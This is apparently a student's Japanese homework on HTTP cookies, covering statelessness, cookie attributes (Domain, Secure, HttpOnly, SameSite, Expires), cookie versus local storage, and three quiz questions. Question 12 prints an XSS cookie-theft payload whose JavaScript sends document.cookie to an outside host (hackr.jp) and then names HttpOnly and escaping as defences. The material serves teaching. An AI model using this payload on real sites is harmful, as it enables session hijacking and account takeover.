# 課題4

## 問題１

　HTTPはステートレス・プロトコルであるため、以前やり取りしたリクエストやレスポンスの状態を管理しない。つまり、以前の状態を踏まえた上でのリクエストを処理することができない。たとえば、認証が必要なWebページで状態管理が無いとすると、認証済みという状態を忘れてしまうため、新たなページに移動するたびに再度ログイン情報を送るか、リクエストごとにパラメーターか何かをつけてログイン状態を管理しなければならなくなる。  
　ステートレス・プロトコルの特徴は残したまま、こういった問題を解決するためにCookieが取り入れられた。Cookieは、リクエストとレスポンスにCookieという情報を載せることによって、クライアントの状態を把握するための仕組み。  
　Cookieは、サーバーからのレスポンスで送られたSet-Cookieというヘッダーフィールドによって、Cookieをクライアントに保持してもらうように指示を出す。次に、クライアントが同じサーバーにリクエストを出す際には、クライアントが自動的にCookieに値を入れて送信する。  
　サーバーはクライアントが送ってきたCookieを見ることで、どのクライアントからのアクセスなのかをチェックし、サーバー上の記録を確かめることで、以前の状態を知ることができる。

## 問題2

送信されない。  
Domain属性が指定されていない場合、同一オリジンでのみ利用可能なため。

## 問題3

送信される。  
同一ホストであれば、異なるポートにも送信される。

[参考](https://datatracker.ietf.org/doc/html/rfc6265)

```
Similarly, cookies for a given host are shared across all the ports on that host
```

## 問題4

送信されない。  
Domain属性が指定されていない場合、同一オリジンでのみ利用可能となり、サブドメインは除外される。

## 問題5

送信される。  
Domain属性が指定されている場合、サブドメインにも送出される。

## 問題6

HttpOnly属性を指定することで可能になる。  
HttpOnly属性は、Cookieの取得をJavaScript経由で行うことができないようにするCookieの拡張機能。  
HttpOnly属性が指定されたCookieはJavaScriptの「Document.cookie」APIにアクセスできなくなる。

## 問題7

Secure属性を指定することで可能になる。  
Secure属性は、WebページがHTTPSで開かれているときのみに、Cookieが送出されるよう制限する。

## 問題8

Expires属性は、ブラウザがCookieを送出することができる有効期限を指定することができる。

## 問題9

SameSite属性は、ブラウザがクロスサイトリクエストとともにCookieが送信されることを防ぐ。  
主な目的は、クロスオリジンの情報漏洩リスクを軽減することで、CSRF の対策にもなる。  
取ることができる値は、Strict, Lax, Noneの3つ。  
Strictの値を設定すると、すべてのクロスサイトの閲覧コンテキストにおいて、ブラウザからターゲットサイトにクッキーが送信されないようになる。  
Laxの値を設定すると、外部のウェブサイトで通常のリンクからアクセスしたときはCookieを許可し、CSRF が発生しやすいリクエストメソッド (POST など) ではCookieをブロックする。  
Noneの値を設定すると、ブラウザはすべての閲覧コンテキストでクッキーを送信する。

[参考](https://owasp.org/www-community/SameSite)

## 問題10

- 4096バイトを超える容量の大きい情報。
- サーバーに送信する必要が無い情報。
- 暗号化されていないパスワードなどの秘匿性の高い情報

## 問題11

クッキーを使うべきタイミング  
ログイン情報などのサーバーに送信する必要がある情報や、秘匿性の高い重要な情報を保持するとき

ローカルストレージを使うべきタイミング  
サイトの表示設定などの、サーバーに送信する必要がない情報。

## 問題12

下記のようなスクリプトを仕込むことで、ユーザーのCookieをXSSによって奪うことができる。

``` JavaScript
<script src=http://hackr.jp/xss.js></scriot>
```

このスクリプトが指し示す http://hackr.jp/xss.js は下記のJavaScriptが記述されている

``` JavaScript
const content = escape(document.cookie);
document.write("<img src=http://hackr.jp/?");
document.write(content);
document.write(">")
```

このJavaScriptがXSSの脆弱性のあるWebアプリケーション上で実行されると、そのWebアプリケーションのドメインのCookie情報にアクセスされる。
そして、その情報が http://hackr.jp/ に送信され、ユーザーのCookie情報を奪うことができる。

対策としてはCookieにHttpOnly属性を設定し、JavaScriptで「document.cookie」にアクセスできなくする方法や、
ユーザーの入出力が行われる箇所でエスケープ処理を行うなどの方法がある。

## クイズ1

レスポンスヘッダーフィールドに、値を出力する処理があるところに改行コードを挿入されることで、任意のCookieをセットされる攻撃は次のうちどれ？

- ディレクトリ・トラバーサル
- メールヘッダーインジェクション
- HTTPヘッダーインジェクション
- リモート・ファイル・インクルージョン

## クイズ2

攻撃者はXSSによりセッションIDを含んだCookieを入手し、ユーザーのセッションIDを入手した攻撃者は、ブラウザのCookieにセッションIDをセットし、Webサイトにアクセスすることでユーザーになりすまし、不正アクセスする行為は次のうちどれ？

- セッションハイジャック
- セッションフィクセーション
- セッションアダプション

## クイズ3

Cookieとは関係が無いのは次のうちどれ？

- RFC2109
- RFC2965
- RFC6265
- RFC1951
